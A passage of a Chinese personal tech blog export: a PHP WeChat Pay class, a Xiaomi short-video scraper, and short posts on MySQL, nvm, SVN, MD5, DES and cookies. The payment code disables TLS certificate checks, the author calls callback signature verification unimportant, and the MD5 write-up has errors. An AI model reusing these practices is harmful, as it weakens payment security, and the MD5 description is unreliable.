$res[\u0026#39;prepay_id\u0026#39;], \u0026#39;nonceStr\u0026#39; =\u0026gt; $this-\u0026gt;nonce_str, \u0026#39;timeStamp\u0026#39; =\u0026gt; time(), \u0026#39;signType\u0026#39; =\u0026gt; \u0026#39;MD5\u0026#39; ]; $sign = $this-\u0026gt;sign($arr); $as[\u0026#39;nonceStr\u0026#39;] = $arr[\u0026#39;nonceStr\u0026#39;]; $as[\u0026#39;package\u0026#39;] = $arr[\u0026#39;package\u0026#39;]; $as[\u0026#39;sign\u0026#39;] = $sign; $as[\u0026#39;timestamp\u0026#39;] = $arr[\u0026#39;timeStamp\u0026#39;]; $as[\u0026#39;appid\u0026#39;] = $arr[\u0026#39;appId\u0026#39;]; return $as; } } else { return false; } } /** * [curlWx 发送curl请求] * @param $url [url地址] * @param $xml [xml] * @return mixed */ protected function curlWx($url, $xml) { //header(\u0026#34;Content-type:text/xml\u0026#34;); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); if (stripos($url, \u0026#34;https://\u0026#34;) !== FALSE) { curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); } else { curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); } curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1); curl_setopt($ch, CURLOPT_HEADER, FALSE); curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($ch, CURLOPT_TIMEOUT, 30); curl_setopt($ch, CURLOPT_POST, TRUE); curl_setopt($ch, CURLOPT_POSTFIELDS, $xml); $data = curl_exec($ch); curl_close($ch); return $data; } /** * [sign 签名] * @param null $app [不为null开启二次签名] * @return string */ protected function sign($params, $app = NULL) { ksort($params); foreach ($params as $key =\u0026gt; $item) { if (!empty($item)) $newArr[] = $key . \u0026#39;=\u0026#39; . $item; } $stringA = implode(\u0026#34;\u0026amp;\u0026#34;, $newArr); $stringSignTemp = $stringA . \u0026#34;\u0026amp;key=\u0026#34; . $this-\u0026gt;key; $sign = MD5($stringSignTemp); if (is_null($app)) $sign = strtoupper($sign); return $sign; } /** * [FromXml xml转数组] * @param $xml * @return bool|mixed */ public function FromXml($xml) { if (!$xml) return false; libxml_disable_entity_loader(true); $data = @json_decode(json_encode(simplexml_load_string($xml, \u0026#39;SimpleXMLElement\u0026#39;, LIBXML_NOCDATA)), true); return $data; } /** * [ToXml 参数组装成xml] * @param array $data * @return bool|string */ public function ToXml($data = []) { if (!is_array($data) || count($data) \u0026lt;= 0) return false; $xml = \u0026#34;\u0026lt;xml\u0026gt;\u0026#34;; foreach ($data as $key =\u0026gt; $val) { if (is_numeric($val)) { $xml .= \u0026#34;\u0026lt;\u0026#34; . $key . \u0026#34;\u0026gt;\u0026#34; . $val . \u0026#34;\u0026lt;/\u0026#34; . $key . \u0026#34;\u0026gt;\u0026#34;; } else { $xml .= \u0026#34;\u0026lt;\u0026#34; . $key . \u0026#34;\u0026gt;\u0026lt;![CDATA[\u0026#34; . $val . \u0026#34;]]\u0026gt;\u0026lt;/\u0026#34; . $key . \u0026#34;\u0026gt;\u0026#34;; } } $xml .= \u0026#34;\u0026lt;/xml\u0026gt;\u0026#34;; return $xml; } /** * [rand_code 生成随机字符串] * @return bool|string */ protected function rand_code() { $str = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;;//62个字符 $str = str_shuffle($str); $str = substr($str, 0, 32); return $str; } /** * [orderQuery 查询订单] * @param $order [商户订单号] * @param $money [订单金额] * @return bool [false | 成功返回流水号] */ public function orderQuery($order, $money) { $url = \u0026#39;https://api.mch.weixin.qq.com/pay/orderquery\u0026#39;; $data = array( \u0026#39;appid\u0026#39; =\u0026gt; $this-\u0026gt;appId, \u0026#39;mch_id\u0026#39; =\u0026gt; $this-\u0026gt;mch_id, \u0026#39;nonce_str\u0026#39; =\u0026gt; $this-\u0026gt;nonce_str, \u0026#39;out_trade_no\u0026#39; =\u0026gt; $order ); $data[\u0026#39;sign\u0026#39;] = $this-\u0026gt;sign($data); $data = $this-\u0026gt;curlWx($url, $this-\u0026gt;ToXml($data)); if ($data) { $res = $this-\u0026gt;FromXml($data); if ($res[\u0026#39;return_code\u0026#39;] == \u0026#39;FAIL\u0026#39;) { return false; } else { // if (isset($res[\u0026#39;return_code\u0026#39;]) and $res[\u0026#39;return_code\u0026#39;] == \u0026#39;SUCCESS\u0026#39; and isset($res[\u0026#39;return_msg\u0026#39;]) and $res[\u0026#39;return_msg\u0026#39;] == \u0026#39;OK\u0026#39; and isset($res[\u0026#39;result_code\u0026#39;]) and $res[\u0026#39;result_code\u0026#39;] == \u0026#39;SUCCESS\u0026#39; and isset($res[\u0026#39;trade_state\u0026#39;]) and $res[\u0026#39;trade_state\u0026#39;] == \u0026#39;SUCCESS\u0026#39;) { // if ($res[\u0026#39;total_fee\u0026#39;] == ($money * 100)) { return $res[\u0026#39;transaction_id\u0026#39;]; } else { return false; } // } else { return false; } // } // } else { return false; } } } 该类含有微信app支付 h5支付 公众号支付（jsapi） 订单查询\nnative扫码支付后面会添加\n异步主要商户订单号查询 并确定金额是否与数据库中一致以及判断该商户订单号是否处理过（谨记）\n个人觉得验签并不重要 有订单查询以及数据库订单验证就行了\n过多的就不介绍了 源码有注释\n","date":"2019-11-02T23:03:00Z","permalink":"https://blog.aaayun.cc/archives/492.html","title":"[更新]php微信支付类（含h5支付、APP二次签名、jsapi支付）"},{"content":"阅尽人间三千愿 处处何人处处卿\n","date":"2019-11-02T08:19:21Z","permalink":"https://blog.aaayun.cc/archives/491.html","title":"言卿"},{"content":"效果怎么样我就不在叙述了\n为了防止此插件滥用接口加入授权 如需使用请赞助本站并联系博主本人\n赞助以及联系方式请在 关于 中查看\n点我下载 密码 i9IAmTNH\n","date":"2019-10-11T06:48:20Z","permalink":"https://blog.aaayun.cc/archives/488.html","title":"【原创】2019云豹主播采集插件"},{"content":"生如蝼蚁，当立鸿鹄之志，命薄如纸，却有不屈之心，未来可期，祝你我飞黄腾达\n","date":"2019-10-10T06:26:35Z","permalink":"https://blog.aaayun.cc/archives/487.html","title":"前程似锦"},{"content":"仗义多为屠狗辈，负心多是读书人\n","date":"2019-10-08T04:20:01Z","permalink":"https://blog.aaayun.cc/archives/486.html","title":"难"},{"content":"经过一段时间的添加和删除，mysql数据库表的自增量主键ID变得混乱​​，需要重新排列\n原理：删除原有的自增ID，重新建立新的自增ID。\n1.删除原有主键\n1 ALTER TABLE `news` DROP `id`; 2.添加新主键字段\n1 ALTER TABLE `news` ADD `id` BIGINT(20) NOT NULL FIRST; 3.设置新主键\n1 ALTER TABLE `news` MODIFY COLUMN `id` BIGINT(20) NOT NULL AUTO_INCREMENT,ADD PRIMARY KEY(id); ","date":"2019-09-27T17:42:00Z","permalink":"https://blog.aaayun.cc/archives/479.html","title":"mysql对自增主键id进行重新排序"},{"content":"轻风拂，傍山晓晚，烟胧伊人倩影。清波碧漾，素手褪红裳，却作弯身掬水，何见芊芊玉足踏意来\n","date":"2019-09-24T19:56:15Z","permalink":"https://blog.aaayun.cc/archives/478.html","title":"轻风拂"},{"content":"linux下利用rdesktop命令远程连接windows\n博主本人使用的是centos7.4其它版本请自测\n1 2 # yum install rdesktop -y # rdesktop -u administrator -d contoso -p 密码 IP -g 1920x1080 -D 常用选项：\n-u：指定User；\n-d：指定域；\n-p：指定密码（不指定密码则在远程时输入）；\n-g：指定分辨率；\n-D：远程后不显示标题栏；\n-f：远程后全屏显示桌面（ctrl+alt+enter退出全屏模式）；\n-r disk:=/home/superlong：将本机（Linux）上的/home/superlong目录映射到Win7上，传输文件更方便；\n-r clipboard:PRIMARYCLIPBOARD：Linux和Windows系统相互可以实现复制和粘贴（实际不添加此选项也可复制粘贴）；\n","date":"2019-09-23T23:15:00Z","permalink":"https://blog.aaayun.cc/archives/476.html","title":"Linux下通过rdesktop远程windows"},{"content":"转载知乎\n我发了一个请求，请求方式、参数、路径写的很清楚了,并且请求了很多次!\n她并没有响应数据，所以我不知道怎么显示数据，继续又发了请求，她响应了个404,我觉得我的路径有问题，经她闺蜜指点，我应该先和她成为好朋友，这次我换了个参数:情人节那天发了个520,这次给我响应了，登上主页面了\n星巴克咖啡厅当面了解了下，回家我对我各种状况进行了增删查改，隔了几天又发了请求，这次她显示权限不足，我又在自身找bug,不经意间发现有好几个人同时再给她发请求，且都得到回应了\n最后我知道我这样的初级程序猿处理不了这样的高并发的问题，不能保证线程安全\n","date":"2019-09-20T09:01:00Z","permalink":"https://blog.aaayun.cc/archives/474.html","title":"现在的男生为什么不追女生?"},{"content":"因为一些原因需要采集短视频，要无水印的那种，没办法只好找了一个平台抓包看看\n思路： 首先fd安卓抓包获取视频列表接口以及分页接口\n操作 很庆幸的是抓到了通过post访问正常\n可惜的是并没有短视频地址，只有标题等一些参数，这个时候灵机一动找分享接口，众所周之网页端加密是不行的，只要能播放就能获取到视频地址，于是新的一轮开始了\n上图的url参数就是视频地址，访问ok，下面可以做采集操作了，代码如下：\n源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 \u0026lt;?php /** * @author anderyly * @email admin@aaayun.cc * @link https://blog.aaayun.cc/ * @copyright Copyright (c) 2019 */ set_time_limit(0); include_once \u0026#34;Curl.php\u0026#34;; include_once \u0026#34;Db.php\u0026#34;; $curl = new Curl(); $db = new Db(); $api = \u0026#39;http://api.cray.inf.miui.com/content/videoList\u0026#39;; $page = 0; $header = [ \u0026#39;Cookie\u0026#39; =\u0026gt; \u0026#39;UM_distinctid=16c8455b31b1c4-0dfaf82ea6a25f-30760d58-1fa400-16c8455b31c215; CNZZDATA1272902400=401331908-1565588304-%7C1565588304; CNZZDATA1277592072=1290948318-1565593164-%7C1565593164; Hm_lvt_d214947968792b839fd669a4decaaffc=1568015305,1568191237,1568269922,1568687357\u0026#39;, ]; $i = 1; while (true) { $param = [ \u0026#39;data\u0026#39; =\u0026gt; \u0026#39;{\u0026#34;header\u0026#34;:{\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceId\u0026#34;:\u0026#34;XWDyRwJadFYDAHnE+F5Hzlct\u0026#34;,\u0026#34;imeiMd5\u0026#34;:\u0026#34;49A22D4E49F5B97EDFD236BA2173E37B\u0026#34;,\u0026#34;apkVersion\u0026#34;:\u0026#34;2.0.0\u0026#34;,\u0026#34;apkChannel\u0026#34;:\u0026#34;xiaomi\u0026#34;},\u0026#34;data\u0026#34;:{\u0026#34;after\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;pageNum\u0026#34;:\u0026#34;\u0026#39; . $page . \u0026#39;\u0026#34;}}\u0026#39;, ]; $res = $curl-\u0026gt;url($api)-\u0026gt;header($header)-\u0026gt;param($param)-\u0026gt;post(); if (!$res) { var_dump(\u0026#39;video is null\u0026#39;); break; } $arr = json_decode($res, true); if (!isset($arr[\u0026#39;data\u0026#39;][\u0026#39;items\u0026#39;])) continue; $list = $arr[\u0026#39;data\u0026#39;][\u0026#39;items\u0026#39;]; foreach ($list as $k =\u0026gt; $v) { if (!isset($v[\u0026#39;id\u0026#39;])) { var_dump(\u0026#39;End\u0026#39;); exit; } $row = $db-\u0026gt;name(\u0026#39;video\u0026#39;)-\u0026gt;field(\u0026#39;id\u0026#39;)-\u0026gt;where(\u0026#39;cid\u0026#39;, $v[\u0026#39;id\u0026#39;])-\u0026gt;find(); if ($row) continue; // 视频id $data[\u0026#39;cid\u0026#39;] = $v[\u0026#39;id\u0026#39;]; // 视频发布时间 13位时间戳 $data[\u0026#39;createTime\u0026#39;] = strtotime(date(\u0026#39;Y-m-d H:i:s\u0026#39;, $v[\u0026#39;createTime\u0026#39;])); // 视频标题 $data[\u0026#39;title\u0026#39;] = $v[\u0026#39;videoInfo\u0026#39;][\u0026#39;desc\u0026#39;]; // 视频封面图 $data[\u0026#39;vthumb\u0026#39;] = $v[\u0026#39;videoInfo\u0026#39;][\u0026#39;coverUrl\u0026#39;]; $data[\u0026#39;thumb\u0026#39;] = str_replace(\u0026#39;http://cdn.cnbj1.fds.api.mi-img.com/\u0026#39;, \u0026#39;/public/video/thumb/\u0026#39;, $v[\u0026#39;videoInfo\u0026#39;][\u0026#39;coverUrl\u0026#39;]); // 视频地址 $link = getVideo($v[\u0026#39;id\u0026#39;]); $data[\u0026#39;vlink\u0026#39;] = $link; $data[\u0026#39;link\u0026#39;] = str_replace(\u0026#39;http://mic.w.xk.miui.com/\u0026#39;, \u0026#39;/public/video/video/\u0026#39;, $link); $data[\u0026#39;page\u0026#39;] = $page; $db-\u0026gt;name(\u0026#39;video\u0026#39;)-\u0026gt;insert($data); var_dump($i); $i++; } $page++; } // 获取视频地址 function getVideo($id) { global $curl; global $header; if ($id == \u0026#39;\u0026#39;) return false; $url = \u0026#39;https://longxia.music.xiaomi.com/api/share?contentType=video\u0026amp;contentId=\u0026#39; . $id; $res = $curl-\u0026gt;url($url)-\u0026gt;header($header)-\u0026gt;get(); $arr = json_decode($res, true); if (!isset($arr[\u0026#39;data\u0026#39;][\u0026#39;videoInfo\u0026#39;][\u0026#39;contentType\u0026#39;]) and $arr[\u0026#39;data\u0026#39;][\u0026#39;videoInfo\u0026#39;][\u0026#39;contentType\u0026#39;] != \u0026#39;VIDEO\u0026#39;) return false; $videoInfo = $arr[\u0026#39;data\u0026#39;][\u0026#39;videoInfo\u0026#39;][\u0026#39;videoInfo\u0026#39;]; return $videoInfo[\u0026#39;url\u0026#39;]; } 源码并没有作下载功能有需要的可以自己写\n","date":"2019-09-20T02:32:00Z","permalink":"https://blog.aaayun.cc/archives/472.html","title":"PHP采集短视频 无水印"},{"content":"博主本人只测试了centos7环境下正常使用 其它linux环境请自测\n1.下载nvm一键安装脚本\n1 # curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.1/install.sh | bash 2.刷新zshrc文件\n1 # source ~/.bashrc 3.安装node（版本可选）\n1 # nvm install v12.10.0 4.切换国内源\n1 # npm install -g cnpm --registry=https://registry.npm.taobao.org 当选择切换国内源后请使用cnpm\n","date":"2019-09-18T23:52:00Z","permalink":"https://blog.aaayun.cc/archives/459.html","title":"centos7下安装nodejs并切换国内源"},{"content":"1、SVN的安装：\n1 yum install subversion 2、服务端命令\nsvnserver — 控制svn系统服务的启动等\nsvnadmin — 版本库的创建、导出、导入、删除等\nsvnlook — 查看版本库的信息等\n3、客户端命令\nsvn – 版本库的检出、更新、提交、重定向等\n4、版本库的创建\n1 svnadmin create /svn/ay 5、版本库的删除\n1 rm -rvf /svn/ay 6、svn服务自动启动\n编辑/etc/rc.local 文件，在文件中\n添加以下内容：\n1 svnserve -d -r /svn/ay 注意：“/svn/ay”为版本库的路径，添加位置必须在 “exit 0”语句之前。\n7、常见SVN客户端命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 svn checkout - 检出 svn add - 添加到版本控制 svn commit - 提交修改到服务端（创建一个新的版本号） svn update - 更新工作副本 svn delete - 从版本库中删除文件或目录 svn diff - 版本差异比较 svn mkdir - 创建目录并增加到版本控制 svn cat - 不检出工作副本直接查看指定文件 ","date":"2019-09-12T18:03:00Z","permalink":"https://blog.aaayun.cc/archives/457.html","title":"centos7下svn常用命令详解"},{"content":"图片预览 点我下载 密码：zwpXD7xX\n","date":"2019-09-09T18:50:00Z","permalink":"https://blog.aaayun.cc/archives/451.html","title":"最新域名防红整站源码带后台配置"},{"content":"心有苍穹人先走，三年泪水杯中流\n","date":"2019-09-08T09:11:31Z","permalink":"https://blog.aaayun.cc/archives/448.html","title":"情 殇"},{"content":"使用说明 下载源码后放置国外空间或vps （静态） 绑定域名，访问即可\n图片预览 点我下载 密码：4Y0laF7C\n","date":"2019-09-07T23:33:00Z","permalink":"https://blog.aaayun.cc/archives/446.html","title":"无须科学上网上谷歌搜索"},{"content":"现在是时候改变你的404错误页面！高级时尚响应式404＆维护页面，还可以附带玩游戏的，不一样的创意！\n图片预览 点我下载\n","date":"2019-09-07T22:21:00Z","permalink":"https://blog.aaayun.cc/archives/437.html","title":"「推荐」很萌的404动画响应式页面"},{"content":"正常情况下，cookie只能在一个应用中共享，即一个cookie只能有创建它的应用程序共享，实现cookie跨域是为了统一应用平台\n下面来看一下，使用P3P协议实现简单的cookie跨域请求：\n1 2 header( \u0026#39;P3P: CP=\u0026#34;CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR\u0026#34;\u0026#39; ); setcookie( \u0026#39;code\u0026#39;, $code, time() + 3600, \u0026#39;/\u0026#39;, \u0026#39;.aaayun.cc\u0026#39; ); ","date":"2019-09-06T19:43:00Z","permalink":"https://blog.aaayun.cc/archives/430.html","title":"PHP上解决cookie跨域问题"},{"content":"对MD5算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。\n在MD5算法中，首先需要对信息进行填充，使其字节长度对512求余的结果等于448。因此，信息的字节长度（Bits Length）将被扩展至N_512+448，即N_64+56个字节（Bytes），N为一个正整数。填充的方法如下，在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。然后，在在这个结果后面附加一个以64位二进制表示的填充前信息长度。经过这两步的处理，现在的信息字节长度=N_512+448+64=(N+1)_512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。\nMD5中有四个32位被称作链接变量（Chaining Variable）的整数参数，他们分别为：A=0x01234567，B=0x89abcdef，C=0xfedcba98，D=0x76543210。\n当设置好这四个链接变量后，就开始进入算法的四轮循环运算。循环的次数是信息中512位信息分组的数目。\n将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。\n主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向右环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。\n以一下是每次操作中用到的四个非线性函数（每轮一个）。\nF(X,Y,Z) =(X\u0026amp;Y)|((~X)\u0026amp;Z)\nG(X,Y,Z) =(X\u0026amp;Z)|(Y\u0026amp;(~Z))\nH(X,Y,Z) =X^Y^Z\nI(X,Y,Z)=Y^(X|(~Z))\n（\u0026amp;是与，|是或，~是非，^是异或）\n这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。\nF是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。\n假设Mj表示消息的第j个子分组（从0到15），\u0026laquo;\nFF(a, b, c, d, Mj, s, ti)表示 a = b + ((a + (F(b, c, d) + Mj + ti) \u0026laquo; s\nGG(a, b, c, d, Mj, s, ti)表示 a = b + ((a + (G(b, c, d) + Mj + ti) \u0026laquo; s\nHH(a, b, c, d, Mj, s, ti)表示 a = b + ((a + (H(b, c, d) + Mj + ti) \u0026laquo; s\nII(a, b, c, d, Mj, s, ti)表示 a = b + ((a + (I(b, c, d) + Mj + ti) \u0026laquo; s\n这四轮（64步）是：\n第一轮\nFF(a, b, c, d, M0, 7, 0xd76aa478)\nFF(d, a, b, c, M1, 12, 0xe8c7b756)\nFF(c, d, a, b, M2, 17, 0x242070db)\nFF(b, c, d, a, M3, 22, 0xc1bdceee)\nFF(a, b, c, d, M4, 7, 0xf57c0faf)\nFF(d, a, b, c, M5, 12, 0x4787c62a)\nFF(c, d, a, b, M6, 17, 0xa8304613)\nFF(b, c, d, a, M7, 22, 0xfd469501)\nFF(a, b, c, d, M8, 7, 0x698098d8)\nFF(d, a, b, c, M9, 12, 0x8b44f7af)\nFF(c, d, a, b, M10, 17, 0xffff5bb1)\nFF(b, c, d, a, M11, 22, 0x895cd7be)\nFF(a, b, c, d, M12, 7, 0x6b901122)\nFF(d, a, b, c, M13, 12, 0xfd987193)\nFF(c, d, a, b, M14, 17, 0xa679438e)\nFF(b, c, d, a, M15, 22, 0x49b40821)\n第二轮\nGG(a, b, c, d, M1, 5, 0xf61e2562)\nGG(d, a, b, c, M6, 9, 0xc040b340)\nGG(c, d, a, b, M11, 14, 0x265e5a51)\nGG(b, c, d, a, M0, 20, 0xe9b6c7aa)\nGG(a, b, c, d, M5, 5, 0xd62f105d)\nGG(d, a, b, c, M10, 9, 0x02441453)\nGG(c, d, a, b, M15, 14, 0xd8a1e681)\nGG(b, c, d, a, M4, 20, 0xe7d3fbc8)\nGG(a, b, c, d, M9, 5, 0x21e1cde6)\nGG(d, a, b, c, M14, 9, 0xc33707d6)\nGG(c, d, a, b, M3, 14, 0xf4d50d87)\nGG(b, c, d, a, M8, 20, 0x455a14ed)\nGG(a, b, c, d, M13, 5, 0xa9e3e905)\nGG(d, a, b, c, M2, 9, 0xfcefa3f8)\nGG(c, d, a, b, M7, 14, 0x676f02d9)\nGG(b, c, d, a, M12, 20, 0x8d2a4c8a)\n第三轮\nHH(a, b, c, d, M5, 4, 0xfffa3942)\nHH(d, a, b, c, M8, 11, 0x8771f681)\nHH(c, d, a, b, M11, 16, 0x6d9d6122)\nHH(b, c, d, a, M14, 23, 0xfde5380c)\nHH(a, b, c, d, M1, 4, 0xa4beea44)\nHH(d, a, b, c, M4, 11, 0x4bdecfa9)\nHH(c, d, a, b, M7, 16, 0xf6bb4b60)\nHH(b, c, d, a, M10, 23, 0xbebfbc70)\nHH(a, b, c, d, M13, 4, 0x289b7ec6)\nHH(d, a, b, c, M0, 11, 0xeaa127fa)\nHH(c, d, a, b, M3, 16, 0xd4ef3085)\nHH(b, c, d, a, M6, 23, 0x04881d05)\nHH(a, b, c, d, M9, 4, 0xd9d4d039)\nHH(d, a, b, c, M12, 11, 0xe6db99e5)\nHH(c, d, a, b, M15, 16, 0x1fa27cf8)\nHH(b, c, d, a, M2, 23, 0xc4ac5665)\n第四轮\nII(a, b, c, d, M0, 6, 0xf4292244)\nII(d, a, b, c, M7, 10, 0x432aff97)\nII(c, d, a, b, M14, 15, 0xab9423a7)\nII(b, c, d, a, M5, 21, 0xfc93a039)\nII(a, b, c, d, M12, 6, 0x655b59c3)\nII(d, a, b, c, M3, 10, 0x8f0ccc92)\nII(c, d, a, b, M10, 15, 0xffeff47d)\nII(b, c, d, a, M1, 21, 0x85845dd1)\nII(a, b, c, d, M8, 6, 0x6fa87e4f)\nII(d, a, b, c, M15, 10, 0xfe2ce6e0)\nII(c, d, a, b, M6, 15, 0xa3014314)\nII(b, c, d, a, M13, 21, 0x4e0811a1)\nII(a, b, c, d, M4, 6, 0xf7537e82)\nII(d, a, b, c, M11, 10, 0xbd3af235)\nII(c, d, a, b, M2, 15, 0x2ad7d2bb)\nII(b, c, d, a, M9, 21, 0xeb86d391)\n常数ti可以如下选择：\n在第i步中，ti是4294967296*abs(sin(i))的整数部分，i的单位是弧度。(4294967296等于2的32次方)\n所有这些完成之后，将A、B、C、D分别加上a、b、c、d。然后用下一分组数据继续运行算法，最后的输出是A、B、C和D的级联。\n当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。\nMD5 (“\u0026quot;) = d41d8cd98f00b204e9800998ecf8427e\nMD5 (“a\u0026quot;) = 0cc175b9c0f1b6a831c399e269772661\nMD5 (“abc\u0026quot;) = 900150983cd24fb0d6963f7d28e17f72\nMD5 (“message digest\u0026quot;) = f96b697d7cb7938d525a2f31aaf161d0\nMD5 (“abcdefghijklmnopqrstuvwxyz\u0026quot;) = c3fcd3d76192e4007dfb496cca67e13b\nMD5 (“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026quot;) =\nd174ab98d277d9f5a5611c2c9f419d9f\n","date":"2019-08-29T06:27:00Z","permalink":"https://blog.aaayun.cc/archives/429.html","title":"MD5口算算法"},{"content":"一、简介\nDES 是对称性加密里面常见一种，全称为 Data Encryption Standard，即数据加密标准，是一种使用密钥加密的块算法。密钥长度是64位(bit)，超过位数密钥被忽略。所谓对称性加密即加密和解密密钥相同，对称性加密一般会按照固定长度，把待加密字符串分成块，不足一整块或者刚好最后有特殊填充字符。\n跨语言做 DES 加密解密经常会出现问题，往往是填充方式不对、编码不一致或者加密解密模式没有对应上造成。常见的填充模式有： pkcs5、pkcs7、iso10126、ansix923、zero。加密模式有：DES-ECB、DES-CBC、DES-CTR、DES-OFB、DES-CFB。\n作为一个软件开发者，可以通过工具测试 DES 加密解密，这里推荐一个在线工具：http://tool.chacuo.net/cryptdes\n二、实现\nPHP 提供了 Mcrypt 系列函数来实现 DES 的加解密，但该扩展中的函数陆续被废弃，自 PHP 7.2.0 起，会移到 PECL。\n所以本代码用了更通用的 OPENSSL 方式实现 DES 的加解密，具体的实现和使用代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 \u0026lt;?php class DES { /** * @var string $method 加解密方法，可通过 openssl_get_cipher_methods() 获得 */ protected $method; /** * @var string $key 加解密的密钥 */ protected $key; /** * @var string $output 输出格式 无、base64、hex */ protected $output; /** * @var string $iv 加解密的向量 */ protected $iv; /** * @var string $options */ protected $options; // output 的类型 const OUTPUT_NULL = \u0026#39;\u0026#39;; const OUTPUT_BASE64 = \u0026#39;base64\u0026#39;; const OUTPUT_HEX = \u0026#39;hex\u0026#39;; /** * DES constructor. * * @param string $key * @param string $method * ECB DES-ECB、DES-EDE3 （为 ECB 模式时，$iv 为空即可） * CBC DES-CBC、DES-EDE3-CBC、DESX-CBC * CFB DES-CFB8、DES-EDE3-CFB8 * CTR * OFB * @param string $output * base64、hex * @param string $iv * @param int $options */ public function __construct($key, $method = \u0026#39;DES-ECB\u0026#39;, $output = \u0026#39;\u0026#39;, $iv = \u0026#39;\u0026#39;, $options = OPENSSL_RAW_DATA | OPENSSL_NO_PADDING) { $this-\u0026gt;key = $key; $this-\u0026gt;method = $method; $this-\u0026gt;output = $output; $this-\u0026gt;iv = $iv; $this-\u0026gt;options = $options; } /** * 加密 * * @param $str * @return string */ public function encrypt($str) { $str = $this-\u0026gt;pkcsPadding($str, 8); $sign = openssl_encrypt($str, $this-\u0026gt;method, $this-\u0026gt;key, $this-\u0026gt;options, $this-\u0026gt;iv); if ($this-\u0026gt;output == self::OUTPUT_BASE64) { $sign = base64_encode($sign); } else if ($this-\u0026gt;output == self::OUTPUT_HEX) { $sign = bin2hex($sign); } return $sign; } /** * 解密 * * @param $encrypted * @return string */ public function decrypt($encrypted) { if ($this-\u0026gt;output == self::OUTPUT_BASE64) { $encrypted = base64_decode($encrypted); } else if ($this-\u0026gt;output == self::OUTPUT_HEX) { $encrypted = hex2bin($encrypted); } $sign = openssl_decrypt($encrypted, $this-\u0026gt;method, $this-\u0026gt;key, $this-\u0026gt;options, $this-\u0026gt;iv); $sign = $this-\u0026gt;unPkcsPadding($sign); $sign = rtrim($sign); return $sign; } /** * 填充 * * @param $str * @param $blocksize * @return string */ private function pkcsPadding($str, $blocksize) { $pad = $blocksize - (strlen($str) % $blocksize); return $str . str_repeat(chr($pad), $pad); } /** * 去填充 * * @param $str * @return string */ private function unPkcsPadding($str) { $pad = ord($str{strlen($str) - 1}); if ($pad \u0026gt; strlen($str)) { return false; } return substr($str, 0, -1 * $pad); } } 应用举例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $key = \u0026#39;12345678\u0026#39;; $iv = \u0026#39;66666666\u0026#39;; // DES CBC 加解密 $des = new DES($key, \u0026#39;DES-CBC\u0026#39;, DES::OUTPUT_BASE64, $iv); echo $base64Sign = $des-\u0026gt;encrypt(\u0026#39;Hello DES CBC\u0026#39;); // 返回 base64编码 echo \u0026#34;\\n\u0026#34;; echo $des-\u0026gt;decrypt($base64Sign); echo \u0026#34;\\n\u0026#34;; // DES ECB 加解密 $des = new DES($key, \u0026#39;DES-ECB\u0026#39;, DES::OUTPUT_HEX); echo $hexSign = $des-\u0026gt;encrypt(\u0026#39;Hello DES ECB\u0026#39;); // 返回 16进制 echo \u0026#34;\\n\u0026#34;; echo $des-\u0026gt;decrypt($hexSign); ","date":"2019-08-28T00:16:00Z","permalink":"https://blog.aaayun.cc/archives/424.html","title":"PHP 中 DES 加密、解密 以及和 Java 互通"},{"content":"ssh以root用户登入服务器 执行以下命令\n1 2 3 4 5 6 7 8 9 10 11 # yum install libmcrypt libmcrypt-devel mcrypt mhash # wget http://pecl.php.net/get/mcrypt-1.0.1.tgz # tar xf mcrypt-1.0.1.tgz # cd mcrypt-1.0.1 # /www/server/php/72/bin/phpize # ./configure --with-php-config=/www/server/php/72/bin/php-config \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install 将下方代码放入php.ini配置文件中\nextension=mcrypt.so 